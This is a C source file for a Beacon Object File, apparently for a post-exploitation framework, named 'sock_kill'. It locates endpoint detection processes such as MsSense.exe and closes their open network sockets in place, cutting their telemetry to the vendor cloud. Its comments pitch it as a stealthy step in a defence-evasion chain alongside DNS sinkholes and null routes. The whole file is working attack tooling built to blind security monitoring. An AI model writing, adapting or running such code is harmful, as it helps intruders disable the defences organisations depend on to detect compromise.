/*
 * sock_kill.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Terminate active TCP connections in a target EDR process by closing its
 * socket handles via NtDuplicateObject(DUPLICATE_CLOSE_SOURCE).
 *
 * THE GAP THIS FILLS
 * ------------------
 * NRPT sinkhole and null routes prevent EDR from ESTABLISHING NEW connections
 * to the cloud. They do NOT terminate connections that are ALREADY OPEN.
 *
 * If the EDR has an established HTTPS session to its cloud backend and you
 * install NRPT + null_route, the existing connection keeps flowing until the
 * EDR closes it (which may be hours). This BOF closes those live sockets
 * immediately, so the full chain takes effect now rather than later.
 *
 * THE MECHANISM
 * -------------
 * Windows TCP sockets are file objects managed by afd.sys (Ancillary Function
 * Driver). Socket handles are ordinary Windows kernel handles with object type
 * "\Device\Afd". When the LAST handle to an AFD socket object is closed:
 *
 *   1. afd.sys sends TCP RST to the remote host immediately
 *   2. The EDR's pending send() / recv() calls return WSAECONNRESET
 *   3. The socket is destroyed — no graceful FIN/ACK, just RST
 *   4. Connection telemetry stops mid-stream
 *
 * NtDuplicateObject(DUPLICATE_CLOSE_SOURCE) closes a handle IN THE TARGET
 * PROCESS. If it was the only handle to that socket, the socket is destroyed.
 * The EDR process itself does nothing — its handle is simply gone.
 *
 * WHY THIS IS MORE STEALTHY THAN WFP / FIREWALL
 * -----------------------------------------------
 *   WFP filter:          visible in fwpuclnt enum, BFE audit log
 *   Firewall rule:        visible in netsh advfirewall show, registry
 *   NRPT sinkhole:        visible in registry, DNS flush event
 *   Null route:           visible in "route print"
 *   sock_kill:            no persistent artifact — the handle is simply gone.
 *                         The TCP RST looks like a normal network hiccup.
 *                         The EDR's log: "send failed: WSAECONNRESET"
 *
 * PRIVILEGE REQUIREMENT
 * ----------------------
 * PROCESS_DUP_HANDLE — weaker than PROCESS_VM_WRITE (required for etwpatch).
 * Admin-level handle access. Works on non-PPL processes.
 *
 * PPL LIMITATION
 * ---------------
 * PPL processes (MDE MsSense.exe, CrowdStrike csagent.exe) block
 * PROCESS_DUP_HANDLE from non-PPL callers. For those, use NRPT + null_route
 * (which prevent reconnects once their existing connection eventually drops).
 *
 * SOCKET IDENTIFICATION
 * ----------------------
 * Windows socket handles have an NT object name starting with "\Device\Afd".
 * We identify them by:
 *   1. Duplicate each handle from target process with DUPLICATE_SAME_ACCESS
 *   2. NtQueryObject(ObjectNameInformation) → get NT object name
 *   3. Check if name starts with "\Device\Afd"
 *   4. Close our inspection duplicate
 *   5. If socket: NtDuplicateObject(DUPLICATE_CLOSE_SOURCE) on original
 *
 * MODES
 * -----
 *   0 — LIST:  enumerate AFD socket handles in target process (no changes)
 *   1 — KILL:  close all AFD socket handles → RST all TCP connections
 *
 * ARGUMENT FORMAT
 *   bof_pack("iZ", mode, processName)
 *   e.g. bof_pack("iZ", 1, L"MsSense.exe")
 *
 * COMPILATION
 *   mingw64: x86_64-w64-mingw32-gcc -o sock_kill.x64.o -c sock_kill.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Fosock_kill.x64.obj sock_kill.bof.c
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ─── NT API declarations ────────────────────────────────────────────────── */

#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR                        NumberOfHandles;
    ULONG_PTR                        Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX;

/* OBJECT_NAME_INFORMATION — returned by NtQueryObject(ObjectNameInformation=1) */
typedef struct _SK_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} SK_UNICODE_STRING;

typedef struct _SK_OBJECT_NAME_INFORMATION {
    SK_UNICODE_STRING Name;
    WCHAR             NameBuffer[512];
} SK_OBJECT_NAME_INFORMATION;

#define ObjectNameInformation 1

typedef LONG NTSTATUS;
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(s)                ((NTSTATUS)(s) >= 0)

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(
    ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtDuplicateObject(
    HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(
    HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);

DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*    WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(void);

/* ─── Helpers ────────────────────────────────────────────────────────────── */

static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* Wide case-insensitive compare */
static BOOL WCmpI(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? (wchar_t)(*a+32) : *a;
        wchar_t cb = (*b >= L'A' && *b <= L'Z') ? (wchar_t)(*b+32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return *a == L'\0' && *b == L'\0';
}

/* Wide prefix check — case-sensitive */
static BOOL WStartsWith(const wchar_t* s, const wchar_t* prefix) {
    while (*prefix) {
        if (*s++ != *prefix++) return FALSE;
    }
    return TRUE;
}

/* Find PID of first process matching name (case-insensitive). Returns 0 if not found. */
static DWORD FindPid(const wchar_t* procName) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    ZeroMem(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            if (WCmpI(pe.szExeFile, procName)) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32NextW(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);
    return pid;
}

/*
 * IsAfdSocket — duplicate a remote handle, query its NT object name,
 * check if it starts with "\Device\Afd".
 *
 * Returns TRUE if the handle is a socket.
 * Out parameter hDup receives our duplicate (caller must close).
 * On FALSE, hDup is INVALID_HANDLE_VALUE.
 */
static BOOL IsAfdSocket(HANDLE hSrcProc, HANDLE hSrcHandle, HANDLE* hDup) {
    *hDup = INVALID_HANDLE_VALUE;

    /* Duplicate with read access to inspect — no CLOSE_SOURCE, just a dup for querying */
    HANDLE dup = INVALID_HANDLE_VALUE;
    NTSTATUS ns = NTDLL$NtDuplicateObject(
        hSrcProc, hSrcHandle,
        (HANDLE)-1,   /* current process pseudo-handle */
        &dup,
        GENERIC_READ, 0, 0 /* no flags — plain duplicate */);
    if (!NT_SUCCESS(ns) || dup == INVALID_HANDLE_VALUE) return FALSE;

    /* Query NT object name */
    SK_OBJECT_NAME_INFORMATION nameInfo;
    ZeroMem(&nameInfo, sizeof(nameInfo));
    ULONG retLen = 0;

    ns = NTDLL$NtQueryObject(dup, ObjectNameInformation,
        &nameInfo, sizeof(nameInfo), &retLen);

    BOOL isSock = FALSE;
    if (NT_SUCCESS(ns) && nameInfo.Name.Buffer && nameInfo.Name.Length > 0) {
        /* Name is a wide string; check prefix "\Device\Afd" */
        nameInfo.Name.Buffer[nameInfo.Name.Length / sizeof(wchar_t)] = L'\0';
        isSock = WStartsWith(nameInfo.Name.Buffer, L"\\Device\\Afd");
    }

    if (isSock) {
        *hDup = dup;
    } else {
        NTDLL$NtClose(dup);
    }
    return isSock;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iZ", mode, procName)):
 *
 *   [int32]    mode
 *     0 = LIST: show sockets without closing them
 *     1 = KILL: close all AFD socket handles → RST all TCP connections
 *
 *   [wchar_t*] procName
 *     Target process name, e.g. L"MsSense.exe" or L"elastic-endpoint.exe"
 *     Semicolon-separated for multiple targets.
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG mode    = BeaconDataInt(&parser);
    int  argBytes = 0;
    wchar_t* rawProc = (wchar_t*)BeaconDataExtract(&parser, &argBytes);

    wchar_t procBuf[512];
    ZeroMem(procBuf, sizeof(procBuf));
    if (rawProc && argBytes > 2) {
        int n = argBytes / (int)sizeof(wchar_t);
        if (n >= 512) n = 511;
        KERNEL32$RtlMoveMemory(procBuf, rawProc, n * sizeof(wchar_t));
    }
    if (!procBuf[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No process name provided.\n"
            "    Usage: sock_kill list|kill MsSense.exe\n"
            "    Multi: sock_kill kill MsSense.exe;elastic-endpoint.exe\n");
        return;
    }

    /* Enumerate all system handles — allocate buffer dynamically */
    ULONG bufSize = 1024 * 1024;  /* start with 1 MB */
    SYSTEM_HANDLE_INFORMATION_EX* sysHandles = NULL;

    for (;;) {
        sysHandles = (SYSTEM_HANDLE_INFORMATION_EX*)
            KERNEL32$VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!sysHandles) {
            BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc(%lu) failed\n", bufSize);
            return;
        }

        ULONG retLen = 0;
        NTSTATUS ns = NTDLL$NtQuerySystemInformation(
            SystemExtendedHandleInformation, sysHandles, bufSize, &retLen);

        if (ns == STATUS_INFO_LENGTH_MISMATCH) {
            KERNEL32$VirtualFree(sysHandles, 0, MEM_RELEASE);
            sysHandles = NULL;
            bufSize = retLen + 65536;  /* add slack */
            continue;
        }
        if (!NT_SUCCESS(ns)) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] NtQuerySystemInformation failed: 0x%08X\n", (ULONG)ns);
            KERNEL32$VirtualFree(sysHandles, 0, MEM_RELEASE);
            return;
        }
        break;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Sock Kill: %s sockets in process(es): %S\n",
        (mode == 0) ? "LISTING" : "KILLING", procBuf);

    /* Process each target process name (semicolon-separated) */
    wchar_t nameCopy[512];
    KERNEL32$RtlMoveMemory(nameCopy, procBuf, sizeof(wchar_t) * 511);
    nameCopy[511] = L'\0';

    wchar_t* curName = nameCopy;
    int totalSockets = 0, totalKilled = 0, totalFailed = 0;

    while (curName && *curName) {
        /* Split on ';' */
        wchar_t* semi = curName;
        while (*semi && *semi != L';') semi++;
        BOOL hasMore = (*semi == L';');
        if (hasMore) *semi = L'\0';

        /* Find PID for this name */
        DWORD targetPid = FindPid(curName);
        if (targetPid == 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] Process '%S' not found\n", curName);
            if (hasMore) { curName = semi + 1; continue; }
            break;
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "  [*] Target: %S  PID=%lu\n", curName, (ULONG)targetPid);

        /* Open target process with PROCESS_DUP_HANDLE */
        HANDLE hProc = KERNEL32$OpenProcess(
            0x0040 /* PROCESS_DUP_HANDLE */, FALSE, targetPid);
        if (!hProc) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] OpenProcess(PID=%lu) failed: %lu\n"
                "      PPL process? Use nrpt_sinkhole + null_route instead.\n",
                (ULONG)targetPid, KERNEL32$GetLastError());
            if (hasMore) { curName = semi + 1; continue; }
            break;
        }

        /* Walk the handle table, find this PID's AFD sockets */
        int socks = 0, killed = 0, failed = 0;
        ULONG_PTR i;
        for (i = 0; i < sysHandles->NumberOfHandles; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* entry = &sysHandles->Handles[i];

            if (entry->UniqueProcessId != (ULONG_PTR)targetPid) continue;

            HANDLE hDup = INVALID_HANDLE_VALUE;
            if (!IsAfdSocket(hProc, (HANDLE)entry->HandleValue, &hDup)) continue;

            socks++;
            totalSockets++;

            /* Close our inspection dup */
            NTDLL$NtClose(hDup);

            if (mode == 0) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "    [socket] handle=0x%04llX\n",
                    (unsigned long long)entry->HandleValue);
            } else {
                /* KILL: close the handle in the target process.
                 * Pass GetCurrentProcess() as target so we get a local dup,
                 * then immediately close it. DUPLICATE_CLOSE_SOURCE = 0x1 ensures
                 * the source handle (in EDR process) is closed. Closing the last
                 * handle to an AFD socket destroys it and terminates the connection. */
                HANDLE hKill = NULL;
                NTSTATUS ns2 = NTDLL$NtDuplicateObject(
                    hProc, (HANDLE)entry->HandleValue,
                    (HANDLE)-1,    /* current process pseudo-handle */
                    &hKill,
                    0, 0,
                    1 /* DUPLICATE_CLOSE_SOURCE */);

                if (NT_SUCCESS(ns2)) {
                    if (hKill) NTDLL$NtClose(hKill);  /* close our local copy */
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "    [KILL] handle=0x%04llX — socket handle closed in target\n",
                        (unsigned long long)entry->HandleValue);
                    killed++;
                    totalKilled++;
                } else {
                    BeaconPrintf(CALLBACK_ERROR,
                        "    [!]   handle=0x%04llX — NtDuplicateObject failed: 0x%08X\n",
                        (unsigned long long)entry->HandleValue, (ULONG)ns2);
                    failed++;
                    totalFailed++;
                }
            }
        }

        KERNEL32$CloseHandle(hProc);

        if (mode == 0) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  Total sockets in %S: %d\n", curName, socks);
        } else {
            BeaconPrintf((killed > 0 || socks == 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                "  %S: %d/%d socket(s) killed\n", curName, killed, socks);
        }

        if (hasMore) curName = semi + 1;
        else break;
    }

    KERNEL32$VirtualFree(sysHandles, 0, MEM_RELEASE);

    if (mode == 1) {
        BeaconPrintf((totalKilled > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "\n[*] RESULT: %d socket(s) killed (%d failed)\n"
            "    All active EDR TCP connections terminated with RST\n"
            "    Combine with nrpt_sinkhole + null_route to prevent reconnects\n",
            totalKilled, totalFailed);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] RESULT: %d socket(s) found\n"
            "    Run 'sock_kill kill <process>' to terminate them\n",
            totalSockets);
    }
}
